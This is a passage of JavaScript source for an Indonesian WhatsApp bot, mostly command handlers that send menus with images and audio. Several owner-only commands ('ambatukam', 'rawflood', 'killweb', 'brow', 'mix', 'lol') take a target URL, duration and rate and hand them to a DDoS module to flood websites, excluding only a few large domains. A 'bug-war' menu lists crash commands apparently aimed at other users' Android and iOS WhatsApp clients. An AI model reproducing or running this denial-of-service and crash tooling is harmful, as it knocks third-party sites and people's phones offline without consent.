      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: `${global.thumbnail}`,
      sourceUrl: `https://whatsapp.com/channel/0029Vb49CCWJ93wO2dLDqx14`,
      mediaType: 1,
      renderLargerThumbnail: true,

      externalAdReply: {
  mentionedJid: [m.sender]
  }}}}, { quoted: m })
    let muskk = {
  audio: fs.readFileSync('./node_modules/Arisu-MD/image/audio/menu.mp3'),
   mimetype: 'audio/mp4',  
   ptt: true, 
     
      };
await RyuuBotz.sendMessage(m.chat, muskk, { quoted: m })
}
break
//=========================================\\
case 'txt2vid': {
  const txt2vid = require('./command/txt2vid')
  txt2vid(m, { RyuuBotz, text, command, prefix, reply })
}
break;
case 'backup': {
  const backupArisu = require('./command/backup-arisu-md')
  backupArisu(m, { RyuuBotz, reply, isRyuuTheCreator, mess })
}
break;
/*====Tq to "Miku hosting for Ddos function====*/
case "ddos":
case 'ddos-menu':
{
if (!text) return replyddos(`${ddos(prefix)}`)
};
        break;
case 'ambatukam': {
  if (!isRyuuTheCreator) return replyddos("Khusus Owner / Premium");
  if (args.length < 3) return replyddos(`Contoh: ${prefix + command} https://target.com 60 800`);
  const [target, dur, rate] = [args[0], parseInt(args[1]), parseInt(args[2])];
  if (isNaN(dur) || isNaN(rate) || dur <= 0 || rate <= 0) return replyddos("Durasi & rate harus angka positif.");
  if (["google.com", "youtube.com", "fbi.gov"].some(d => target.includes(d))) return replyddos(" Domain terlarang.");
  ddos.ambatukam({ target, duration: dur, rate, reply: replyddos });
}
break;
case 'rawflood': {
  if (!isRyuuTheCreator) return replyddos("Khusus Owner / Premium");
  if (args.length < 2) return replyddos(`Contoh: ${prefix + command} https://target.com 60`);
  const target = args[0];
  const time = parseInt(args[1]);
  if (isNaN(time) || time <= 0) return replyddos("Durasi harus angka positif!");
  ddos.rawflood({ target, time, reply: replyddos });
}
break;
case 'brow': {
  if (!isRyuuTheCreator) return reply(mess.only.owner);
  if (!text) return reply(`*Example*: ${prefix + command} [url]`);
  ddos.brow({ text, reply });
}
break;
case 'mix': {
  if (!isRyuuTheCreator) return reply(mess.only.owner);
  if (!text) return reply(`*Example*: ${prefix + command} [url]`);
  ddos.mix({ text, reply });
}
break;
case 'killweb': {
  if (!isRyuuTheCreator && !isRyuuPartner) return reply(mess.only.owner);
  if (args.length < 2) return reply(`Contoh: ${prefix + command} https://target.com 60`);
  const target = args[0];
  const dur = parseInt(args[1]);
  if (isNaN(dur) || dur <= 0 || dur > 900000) return reply(`❌ Durasi harus 1 - 90000 detik`);
  if (["google.com", "youtube.com", "fbi.gov"].some(domain => target.includes(domain))) return reply(`❌ Domain terlarang.`);
  await ddos.killweb({ target, duration: dur, reply });
}
break;
case 'lol': {
  if (!isRyuuTheCreator) return reply(mess.only.owner);
  if (!text) return reply(`*Example*: ${prefix + command} [url]`);
  ddos.lol({ text, reply });
}
break;
case "allmenu":
        {
          RyuuBotz.sendMessage(m.chat, {
            react: {
              text: `⏱️`,
              key: m.key
            }
          });
          let ReinzID_sad = `${allmenu(prefix, hituet)}\n\n${newupdate(prefix)}\n\n${rfai(prefix)}\n\n${ddos(prefix)}`;
          RyuuBotz.sendMessage(m.chat, {
            video: fs.readFileSync("./node_modules/Arisu-MD/data/image/thumbvid.mp4"),
            gifPlayback: true,
            caption: ReinzID_sad,
            contextInfo: {
              forwardingScore: 1,
              isForwarded: true,
              forwardedNewsletterMessageInfo: {
                newsletterName: `${global.ownername}`,
                newsletterJid: `120363419382206255@newsletter`
              },
              externalAdReply: {
                title: botname,
                body: ownername,
                thumbnailUrl: `${global.thumbnail}`,
                sourceUrl: `https://whatsapp.com/channel/0029Vb5xetZBadmS2IPdmG1X`,
                mediaType: 1,
                renderLargerThumbnail: true,
                externalAdReply: {
                  mentionedJid: [m.sender]
                }
              }
            }
          }, {
            quoted: m
          });
          let muskk = {
            audio: fs.readFileSync("./node_modules/Arisu-MD/image/audio/allmenu.mp3"),
            mimetype: "audio/mp4",
            ptt: true
          };
          await RyuuBotz.sendMessage(m.chat, muskk, {
            quoted: m
          });
        }
        break;
        case "renai-floops":
        case "rf-ai":
        const replyrf = (text) => {
  RyuuBotz.sendMessage(m.chat, {
    text,
    contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
      externalAdReply: {
        title: 'Renai Floops AI',
        body: `ғᴏʟʟᴏᴡ ɪɢ ${global.ig}`,
        thumbnailUrl: 'https://files.catbox.moe/dmpnvs.jpg',
        sourceUrl: 'https://instagram.com/reinzz311'
      }
    }
  }, { quoted: m });
}
if (!text) return replyrf(`${rfai(prefix)}`);
        break;        
case 'aoi':
case 'aoi-ai': {
const aoiai = require('./command/aoi-ai');
  aoiai(m, text, prefix, command, replyaoi, RyuuBotz);
  }
  break;
case 'amelia':
case 'amelia-ai': {
const ameliaai = require('./command/amelia-ai');
  ameliaai(m, text, prefix, command, replyamelia, RyuuBotz);
  }
break;
case 'iroha':
case 'ilya-ai':
case 'ilya':
case 'iroha-ai': {
const irohaai = require('./command/iroha-ai');
  irohaai(m, text, prefix, command, replyiroha, RyuuBotz);
}
break;
case 'bai':
case 'mongfa':
case 'bai-ai':
case 'mongfa-ai': {
const mongfaai = require('./command/mongfa-ai');
  mongfaai(m, text, prefix, command, replymongfa, RyuuBotz);
}
break;
case 'karin':
case 'kusuriyubi':
case 'karin-ai':
case 'kusuriyubi-ai': {
const karinai = require('./command/karin-ai');
  karinai(m, text, prefix, command, replykarin, RyuuBotz);
}
break;

        case "newupdate":
        case "update":
        case "new-update":
        {
          RyuuBotz.sendMessage(m.chat, {
            react: {
              text: `⏱️`,
              key: m.key
            }
          });
          let ReinzID_sad = `${newupdate(prefix)}`;
          RyuuBotz.sendMessage(m.chat, {
            video: fs.readFileSync("./node_modules/Arisu-MD/data/image/thumbvid.mp4"),
            gifPlayback: true,
            caption: ReinzID_sad,
            contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
              externalAdReply: {
                title: botname,
                body: ownername,
                thumbnailUrl: `${global.thumbnail}`,
                sourceUrl: `https://whatsapp.com/channel/0029Vb5xetZBadmS2IPdmG1X`,
                mediaType: 1,
                renderLargerThumbnail: true,
                externalAdReply: {
                  mentionedJid: [m.sender]
                }
              }
            }
          }, {
            quoted: m
          });
          let muskk = {
            audio: fs.readFileSync("./node_modules/Arisu-MD/image/audio/allmenu.mp3"),
            mimetype: "audio/mp4",
            ptt: true
          };
          await RyuuBotz.sendMessage(m.chat, muskk, {
            quoted: m
          });
        }
        break;
case 'domainmenu': {
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *DOMAIN MENU* )▭▬▭

⭔ ${prefix}subdomain 

 Powered By *${ownername}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
RyuuBotz.sendMessage(m.chat, {
text: text12,
contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
externalAdReply: {
title: ownername,
body: 'bodynya',
"thumbnailUrl": 'https://files.catbox.moe/q93vvm.jpg',
sourceUrl: wagc,
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: m})
}
break

case 'gamemenu': {
   let ReinzID_sad = `${gamemenu(prefix, hituet)}`
RyuuBotz.sendMessage(m.chat, {
      image: fs.readFileSync('./node_modules/Arisu-MD/data/image/thumb.jpg'),
      gifPlayback: true,
      caption: ReinzID_sad,
      contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
      forwardingScore: 1,
      isForwarded: true,
      externalAdReply: {
title:`${global.botname}`,
body: `ғᴏʟʟᴏᴡ ɪɢ ${global.ig}`,
thumbnailUrl: "https://files.catbox.moe/kchzeu.jpg",
sourceUrl: "https://instagram.com/reinzz.311"
}},
      }, {
                        quoted: m
                    })
}
           break;
case 'cpanelmenu': {
   let ReinzID_sad = `${cpanelmenu(prefix, hituet)}`
RyuuBotz.sendMessage(m.chat, {
      image: fs.readFileSync('./node_modules/Arisu-MD/data/image/thumb.jpg'),
      gifPlayback: true,
      caption: ReinzID_sad,
      contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
      externalAdReply: {
title:`${global.botname}`,
body: `ғᴏʟʟᴏᴡ ɪɢ ${global.ig}`,
thumbnailUrl: "https://files.catbox.moe/kchzeu.jpg",
sourceUrl: "https://instagram.com/reinzz.311"
}},
      }, {
                        quoted: m
                    })
}
           break
//=========================================\\
case 'storemenu': {
  let ReinzID_sad = `${storemenu(prefix, hituet)}`
RyuuBotz.sendMessage(m.chat, {
      image: fs.readFileSync('./node_modules/Arisu-MD/data/image/thumb.jpg'),
      gifPlayback: true,
      caption: ReinzID_sad,
      contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
      externalAdReply: {
title:`${global.botname}`,
body: `ғᴏʟʟᴏᴡ ɪɢ ${global.ig}`,
thumbnailUrl: "https://files.catbox.moe/kchzeu.jpg",
sourceUrl: "https://instagram.com/reinzz.311"
}},
      }, {
                        quoted: m
                    })
}
           break
//=========================================\\
case 'quotesmenu': {
  let ReinzID_sad = `${quotesmenu(prefix, hituet)}`
RyuuBotz.sendMessage(m.chat, {
      image: fs.readFileSync('./node_modules/Arisu-MD/data/image/thumb.jpg'),
      gifPlayback: true,
      caption: ReinzID_sad,
      contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
      externalAdReply: {
title:`${global.botname}`,
body: `ғᴏʟʟᴏᴡ ɪɢ ${global.ig}`,
thumbnailUrl: "https://files.catbox.moe/kchzeu.jpg",
sourceUrl: "https://instagram.com/reinzz.311"
}},
      }, {
                        quoted: m
                    })
}
           break
//=========================================\\
case 'anonymousmenu': {
  let ReinzID_sad = `${anonymousmenu(prefix, hituet)}`
RyuuBotz.sendMessage(m.chat, {
      image: fs.readFileSync('./node_modules/Arisu-MD/data/image/thumb.jpg'),
      gifPlayback: true,
      caption: ReinzID_sad,
      contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
      externalAdReply: {
title:`${global.botname}`,
body: `ғᴏʟʟᴏᴡ ɪɢ ${global.ig}`,
thumbnailUrl: "https://files.catbox.moe/kchzeu.jpg",
sourceUrl: "https://instagram.com/reinzz.311"
}},
      }, {
                        quoted: m
                    })
}
           break
//=========================================\\
case 'islamimenu': {
  let ReinzID_sad = `${islamimenu(prefix, hituet)}`
RyuuBotz.sendMessage(m.chat, {
      image: fs.readFileSync('./node_modules/Arisu-MD/data/image/thumb.jpg'),
      gifPlayback: true,
      caption: ReinzID_sad,
      contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
      externalAdReply: {
title:`${global.botname}`,
body: `ғᴏʟʟᴏᴡ ɪɢ ${global.ig}`,
thumbnailUrl: "https://files.catbox.moe/kchzeu.jpg",
sourceUrl: "https://instagram.com/reinzz.311"
}},
      }, {
                        quoted: m
                    })
}
           break

case 'rpgmenu': {
  let ReinzID_sad = `${rpgmenu(prefix, hituet)}`
RyuuBotz.sendMessage(m.chat, {
      image: fs.readFileSync('./node_modules/Arisu-MD/data/image/thumb.jpg'),
      gifPlayback: true,
      caption: ReinzID_sad,
      contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
      externalAdReply: {
title:`${global.botname}`,
body: `ғᴏʟʟᴏᴡ ɪɢ ${global.ig}`,
thumbnailUrl: "https://files.catbox.moe/kchzeu.jpg",
sourceUrl: "https://instagram.com/reinzz.311"
}},
      }, {
                        quoted: m
                    })
}
           break

case 'ownermenu': {
  let ReinzID_sad = `${ ownermenu(prefix, hituet)}`
RyuuBotz.sendMessage(m.chat, {
      image: fs.readFileSync('./node_modules/Arisu-MD/data/image/thumb.jpg'),
      gifPlayback: true,
      caption: ReinzID_sad,
      contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
      externalAdReply: {
title:`${global.botname}`,
body: `ғᴏʟʟᴏᴡ ɪɢ ${global.ig}`,
thumbnailUrl: "https://files.catbox.moe/kchzeu.jpg",
sourceUrl: "https://instagram.com/reinzz.311"
}},
      }, {
                        quoted: m
                    })
}
           break
case 'pushmenu': {
  let ReinzID_sad = `${ pushmenu(prefix, hituet)}`
RyuuBotz.sendMessage(m.chat, {
      image: fs.readFileSync('./node_modules/Arisu-MD/data/image/thumb.jpg'),
      gifPlayback: true,
      caption: ReinzID_sad,
      contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
      externalAdReply: {
title:`${global.botname}`,
body: `ғᴏʟʟᴏᴡ ɪɢ ${global.ig}`,
thumbnailUrl: "https://files.catbox.moe/kchzeu.jpg",
sourceUrl: "https://instagram.com/reinzz.311"
}},
      }, {
                        quoted: m
                    })
}
           break
case 'othermenu': {
  let ReinzID_sad = `${othermenu(prefix, hituet)}`
RyuuBotz.sendMessage(m.chat, {
      image: fs.readFileSync('./node_modules/Arisu-MD/data/image/thumb.jpg'),
      gifPlayback: true,
      caption: ReinzID_sad,
      contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
      externalAdReply: {
title:`${global.botname}`,
body: `ғᴏʟʟᴏᴡ ɪɢ ${global.ig}`,
thumbnailUrl: "https://files.catbox.moe/kchzeu.jpg",
sourceUrl: "https://instagram.com/reinzz.311"
}},
      }, {
                        quoted: m
                    })
}
           break
           case 'newupdatemenu': { 
let ReinzID_sad = `${newupdate(prefix, hituet)}`  
RyuuBotz.sendMessage(m.chat, {
image: fs.readFileSync('./node_modules/Arisu-MD/data/image/thumb.jpg'),
gifPlayback: true,
      caption: ReinzID_sad,
      contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
externalAdReply: {
title:`${global.botname}`,
body: `ғᴏʟʟᴏᴡ ɪɢ ${global.ig}`,
thumbnailUrl: "https://files.catbox.moe/kchzeu.jpg",
sourceUrl: "https://instagram.com/reinzz.311"
}},
      }, {
                        quoted: m
                    })
}
           break
case 'downloadmenu': { 
let ReinzID_sad = `${downloadmenu(prefix, hituet)}`  
RyuuBotz.sendMessage(m.chat, {
image: fs.readFileSync('./node_modules/Arisu-MD/data/image/thumb.jpg'),
gifPlayback: true,
      caption: ReinzID_sad,
      contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
externalAdReply: {
title:`${global.botname}`,
body: `ғᴏʟʟᴏᴡ ɪɢ ${global.ig}`,
thumbnailUrl: "https://files.catbox.moe/kchzeu.jpg",
sourceUrl: "https://instagram.com/reinzz.311"
}},
      }, {
                        quoted: m
                    })
}
           break


case 'groupmenu': {
  let ReinzID_sad = `${groupmenu(prefix, hituet)}`
RyuuBotz.sendMessage(m.chat, {
      image: fs.readFileSync('./node_modules/Arisu-MD/data/image/thumb.jpg'),
      gifPlayback: true,
      caption: ReinzID_sad,
      contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
      externalAdReply: {
title:`${global.botname}`,
body: `ғᴏʟʟᴏᴡ ɪɢ ${global.ig}`,
thumbnailUrl: "https://files.catbox.moe/kchzeu.jpg",
sourceUrl: "https://instagram.com/reinzz.311"
}},
      }, {
                        quoted: m
                    })
}
           break
case 'confess':
case 'confes':
case 'menfes':
case 'menfess': {
  await menfess.confess({ m, text, reply, RyuuBotz, prefix, command, pushname });
}
break;

case 'balasmenfess': {
  await menfess.balasmenfess({ m, reply, RyuuBotz, prefix });
}
break;

case 'tolakmenfess': {
  await menfess.tolakmenfess({ m, reply, RyuuBotz });
}
break;

case 'stopmenfess': {
  await menfess.stopmenfess({ m, reply, RyuuBotz });
}
break;
case 'funmenu': { 
  let ReinzID_sad = `${funmenu(prefix, hituet)}`
RyuuBotz.sendMessage(m.chat, {
      image: fs.readFileSync('./node_modules/Arisu-MD/data/image/thumb.jpg'),
      gifPlayback: true,
      caption: ReinzID_sad,
      contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
      externalAdReply: {
title:`${global.botname}`,
body: `ғᴏʟʟᴏᴡ ɪɢ ${global.ig}`,
thumbnailUrl: "https://files.catbox.moe/kchzeu.jpg",
sourceUrl: "https://instagram.com/reinzz.311"
}},
      }, {
                        quoted: m
                    })
}
           break
case 'stalkermenu': {
let ReinzID_sad = `${stalkermenu(prefix, hituet)}`
RyuuBotz.sendMessage(m.chat, {
      image: fs.readFileSync('./node_modules/Arisu-MD/data/image/thumb.jpg'),
      gifPlayback: true,
      caption: ReinzID_sad,
      contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
      externalAdReply: {
title:`${global.botname}`,
body: `ғᴏʟʟᴏᴡ ɪɢ ${global.ig}`,
thumbnailUrl: "https://files.catbox.moe/kchzeu.jpg",
sourceUrl: "https://instagram.com/reinzz.311"
}},
      }, {
                        quoted: m
                    })
}
           break
case 'randomphotomenu': {let ReinzID_sad = `${randomphotomenu(prefix, hituet)}`
RyuuBotz.sendMessage(m.chat, {
      image: fs.readFileSync('./node_modules/Arisu-MD/data/image/thumb.jpg'),
      gifPlayback: true,
      caption: ReinzID_sad,
      contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
      externalAdReply: {
title:`${global.botname}`,
body: `ғᴏʟʟᴏᴡ ɪɢ ${global.ig}`,
thumbnailUrl: "https://files.catbox.moe/kchzeu.jpg",
sourceUrl: "https://instagram.com/reinzz.311"
}},
      }, {
                        quoted: m
                    })
}
           break
case 'randomvideomenu': {
  let ReinzID_sad = `${randomvideomenu(prefix, hituet)}`
RyuuBotz.sendMessage(m.chat, {
      image: fs.readFileSync('./node_modules/Arisu-MD/data/image/thumb.jpg'),
      gifPlayback: true,
      caption: ReinzID_sad,
      contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
      externalAdReply: {
title:`${global.botname}`,
body: `ғᴏʟʟᴏᴡ ɪɢ ${global.ig}`,
thumbnailUrl: "https://files.catbox.moe/kchzeu.jpg",
sourceUrl: "https://instagram.com/reinzz.311"
}},
      }, {
                        quoted: m
                    })
}
           break
case 'ephoto360menu': {
  let ReinzID_sad = `${ephoto360menu(prefix, hituet)}`
RyuuBotz.sendMessage(m.chat, {
      image: fs.readFileSync('./node_modules/Arisu-MD/data/image/thumb.jpg'),
      gifPlayback: true,
      caption: ReinzID_sad,
      contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
      externalAdReply: {
title:`${global.botname}`,
body: `ғᴏʟʟᴏᴡ ɪɢ ${global.ig}`,
thumbnailUrl: "https://files.catbox.moe/kchzeu.jpg",
sourceUrl: "https://instagram.com/reinzz.311"
}},
      }, {
                        quoted: m
                    })
}
           break
case 'nsfwmenu': {
  let ReinzID_sad = `${nsfwmenu(prefix, hituet)}`
RyuuBotz.sendMessage(m.chat, {
      image: fs.readFileSync('./node_modules/Arisu-MD/data/image/thumb.jpg'),
      gifPlayback: true,
      caption: ReinzID_sad,
      contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
      externalAdReply: {
title:`${global.botname}`,
body: `ғᴏʟʟᴏᴡ ɪɢ ${global.ig}`,
thumbnailUrl: "https://files.catbox.moe/kchzeu.jpg",
sourceUrl: "https://instagram.com/reinzz.311"
}},
      }, {
                        quoted: m
                    })
}
           break
case 'animemenu': {
  let ReinzID_sad = `${animemenu(prefix, hituet)}`
RyuuBotz.sendMessage(m.chat, {
      image: fs.readFileSync('./node_modules/Arisu-MD/data/image/thumb.jpg'),
      gifPlayback: true,
      caption: ReinzID_sad,
      contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
      externalAdReply: {
title:`${global.botname}`,
body: `ғᴏʟʟᴏᴡ ɪɢ ${global.ig}`,
thumbnailUrl: "https://files.catbox.moe/kchzeu.jpg",
sourceUrl: "https://instagram.com/reinzz.311"
}},
      }, {
                        quoted: m
                    })
}
           break
case 'primbonmenu': {
  let ReinzID_sad = `${primbonmenu(prefix, hituet)}`
RyuuBotz.sendMessage(m.chat, {
      image: fs.readFileSync('./node_modules/Arisu-MD/data/image/thumb.jpg'),
      gifPlayback: true,
      caption: ReinzID_sad,
      contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
      externalAdReply: {
title:`${global.botname}`,
body: `ғᴏʟʟᴏᴡ ɪɢ ${global.ig}`,
thumbnailUrl: "https://files.catbox.moe/kchzeu.jpg",
sourceUrl: "https://instagram.com/reinzz.311"
}},
      }, {
                        quoted: m
                    })
}
           break
case 'beritamenu': {
  let ReinzID_sad = `${beritamenu(prefix, hituet)}`
RyuuBotz.sendMessage(m.chat, {
      image: fs.readFileSync('./node_modules/Arisu-MD/data/image/thumb.jpg'),
      gifPlayback: true,
      caption: ReinzID_sad,
      contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
      externalAdReply: {
title:`${global.botname}`,
body: `ғᴏʟʟᴏᴡ ɪɢ ${global.ig}`,
thumbnailUrl: "https://files.catbox.moe/kchzeu.jpg",
sourceUrl: "https://instagram.com/reinzz.311"
}},
      }, {
                        quoted: m
                    })
}
           break
case 'sertifikatmenu': {
  let ReinzID_sad = `${sertifikatmenu(prefix, hituet)}`
RyuuBotz.sendMessage(m.chat, {
      image: fs.readFileSync('./node_modules/Arisu-MD/data/image/thumb.jpg'),
      gifPlayback: true,
      caption: ReinzID_sad,
      contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
      externalAdReply: {
title:`${global.botname}`,
body: `ғᴏʟʟᴏᴡ ɪɢ ${global.ig}`,
thumbnailUrl: "https://files.catbox.moe/kchzeu.jpg",
sourceUrl: "https://instagram.com/reinzz.311"
}},
      }, {
                        quoted: m
                    })
}
           break
case 'stickermenu': {
   let ReinzID_sad = `${stickermenu(prefix, hituet)}`
RyuuBotz.sendMessage(m.chat, {
      image: fs.readFileSync('./node_modules/Arisu-MD/data/image/thumb.jpg'),
      gifPlayback: true,
      caption: ReinzID_sad,
      contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
      externalAdReply: {
title:`${global.botname}`,
body: `ғᴏʟʟᴏᴡ ɪɢ ${global.ig}`,
thumbnailUrl: "https://files.catbox.moe/kchzeu.jpg",
sourceUrl: "https://instagram.com/reinzz.311"
}},
      }, {
                        quoted: m
                    })
}
           break
case 'databasemenu': {
  let ReinzID_sad = `${databasemenu(prefix, hituet)}`
RyuuBotz.sendMessage(m.chat, {
      image: fs.readFileSync('./node_modules/Arisu-MD/data/image/thumb.jpg'),
      gifPlayback: true,
      caption: ReinzID_sad,
      contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
      externalAdReply: {
title:`${global.botname}`,
body: `ғᴏʟʟᴏᴡ ɪɢ ${global.ig}`,
thumbnailUrl: "https://files.catbox.moe/kchzeu.jpg",
sourceUrl: "https://instagram.com/reinzz.311"
}},
      }, {
                        quoted: m
                    })
}
           break
case 'aimenu': {
   let ReinzID_sad = `${aimenu(prefix, hituet)}`
RyuuBotz.sendMessage(m.chat, {
      image: fs.readFileSync('./node_modules/Arisu-MD/data/image/thumb.jpg'),
      gifPlayback: true,
      caption: ReinzID_sad,
      contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
      externalAdReply: {
title:`${global.botname}`,
body: `ғᴏʟʟᴏᴡ ɪɢ ${global.ig}`,
thumbnailUrl: "https://files.catbox.moe/kchzeu.jpg",
sourceUrl: "https://instagram.com/reinzz.311"
}},
      }, {
                        quoted: m
                    })
}
           break
case "bugmenu": case "warning-menu": case "perang-menu": {
    let ReinzID_sad = `
┏『 *\`乂 ʙ ᴜ ɢ - ᴡ ᴀ ʀ 乂\`* 』━◧
┣➤ *xandroid*
┣➤ *xandroid2*
┣➤ *systemuicrash*
┣➤ *xsysui*
┣➤ *xios*
┣➤ *xios2*
┣➤ *xgc*
┣➤ *ioskill*
┣➤ *iosx*
┣➤ *onekill*
┣➤ *oneclickall*
┣➤ *xsamsung*
┣➤ *xwaweb*
┣➤ *doublekill*
┣➤ *triplekill*
┣➤ *xblank*
┣➤ *invishard2*
┣➤ *invishard*
┣➤ *xdelay*
┣➤ *crashx*
┣➤ *fcinvis*
┣➤ *inviscombo*
┣➤ *💀*
┗━━━━━━━━━━━━━━━━⊱
> By RyuuReinzz`;

    RyuuBotz.sendMessage(m.chat, {
        image: fs.readFileSync("./node_modules/Arisu-MD/data/image/thumb.jpg"),
        gifPlayback: true,
        caption: ReinzID_sad,
        contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
            forwardedNewsletterMessageInfo: {
                newsletterName: `${global.ownername}`,
                newsletterJid: `120363419382206255@newsletter`
            },
            externalAdReply: {
                title: `${global.botname}`,
                body: `ғᴏʟʟᴏᴡ ɪɢ ${global.ig}`,
                thumbnailUrl: "https://files.catbox.moe/kchzeu.jpg",
                sourceUrl: "https://instagram.com/reinzz311"
            }
        }
    }, {
        quoted: m
    });
}
break;
case 'pyterodactylemenu': {
  let ReinzID_sad = `${pyterodactylemenu(prefix, hituet)}`
RyuuBotz.sendMessage(m.chat, {
      image: fs.readFileSync('./node_modules/Arisu-MD/data/image/thumb.jpg'),
      gifPlayback: true,
      caption: ReinzID_sad,
      contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: '' + global.ownername,
                newsletterJid: '120363419382206255@newsletter'
            },
      externalAdReply: {
title:`${global.botname}`,
body: `ғᴏʟʟᴏᴡ ɪɢ ${global.ig}`,
thumbnailUrl: "https://files.catbox.moe/kchzeu.jpg",
sourceUrl: "https://instagram.com/reinzz.311"
}},
      }, {
                        quoted: m
                    })
}
           break
case 'friend':
case 'searchfriend':{
RyuuBotz.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
let teman = pickRandom(reinzmahiruverifikasiuser)
setTimeout(() => {
}, 1000)
setTimeout(() => {
replyReinzID('Berhasil Mendapatkan Satu Orang')
}, 5000)
setTimeout(() => {
RyuuBotz.sendMessage(from, {text: `Di Sini @${teman.split("@")[0]}`, mentions: [teman]}, { quoted : m })
}, 9000)
}
break
case 'bacaperaturan':
case 'rules': {
  const cap = `┏━━━°❀ ❬ *Rules ${botname} MultiDevice* ❭ ❀°━━━┓

1. ✧ *Dilarang Melakukan Spam Kepada Bot*, Jika Ketahuan Akan Di Banned.

2. ✧ Jika Bot Tidak Menjawab 1x, Silahkan Dicoba Lagi. Tapi Jika Bot Tidak Menjawab 2x, Itu Artinya Delay, Jangan Dipakai Dulu.

3. ✧ *Jangan Spam Bot, Kalau Belum Donasi, Sadar Diri Aja Makenya* :)

